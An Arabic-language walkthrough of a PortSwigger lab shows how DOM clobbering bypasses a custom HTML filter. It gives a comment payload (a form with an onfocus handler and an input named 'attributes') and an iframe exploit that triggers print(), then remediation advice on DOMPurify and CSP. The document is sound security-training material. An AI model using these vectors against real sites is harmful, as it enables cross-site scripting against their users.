# [Clobbering DOM attributes to bypass HTML filters](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)

## **`الهدف`**
قم بإنشاء `Vector` يتجاوز الفلتر ويستخدم `DOM clobbering` لحقن `Vector` يستدعي الدالة `print()`.
## **`خطوات الحل`**
سنقوم بالدخول على أى تدوينة وكتابة أى تعليق ببيانات عشوائية ولكن سنضع الكود التالي في حقل `Comment`
```html
<form id=x tabindex=0 onfocus=print()><input id=attributes>
```
وبعد ذلك سنقوم بالدخول إلى السيرفر الخاص بنا الذي يوفره اللاب ونضع السكريبت التالي في خانة `Body`
```html
<iframe src=https://0a4500e80448e7e3855b7b60005900b1.web-security-academy.net/post?postId=5 onload="setTimeout(()=>this.src=this.src+'#x',500)"></iframe>
```
بعد ذلك نقوم بالضغط على `Store` ثم `Deliver exploit to victim` لننتهي من حل اللاب. 
## **`ترقيع الثغرة`**
يجب التحقق من أن خصائص العنصر مثل `attributes` يتم جلبها من أصلها الحقيقي الموثوق `Element.prototype` باستخدام دوال آمنة مثل `Object.getOwnPropertyDescriptor`، وليس من العنصر نفسه مباشرة `element.attributes` لتجنب خداع الكود بواسطة عنصر `<input>` يحمل `id=attributes`.

ولا يجب كتابة `Custom HTML Sanitizers` يدويًا لأن هذا أسلوب برمجي سيء من الناحية الأمنية، وبدلًا من ذلك إذا كان التطبيق يحتاج لتنظيف مدخلات المستخدمين وحذف الخصائص الخطيرة، فالأفضل استخدام مكتبات أمنية موثوقة ومختبرة مثل `DOMPurify` بدلًا من الاعتماد على أكواد جافاسكريبت يدوية قابلة للتجاوز.

وكطبقة حماية إضافية، يجب على السيرفر إرسال ترويسة سياسة أمان المحتوى `CSP` صارمة تمنع تنفيذ أكواد `JS` المدمجة `Inline Scripts` أو المنفذة عبر أحداث مثل `onfocus`، فحتى لو فشل المطور في تأمين الكود برمجياً ونجح المهاجم في حقن الكود، سيتدخل المتصفح ويمنع تنفيذ الـ `print()`.
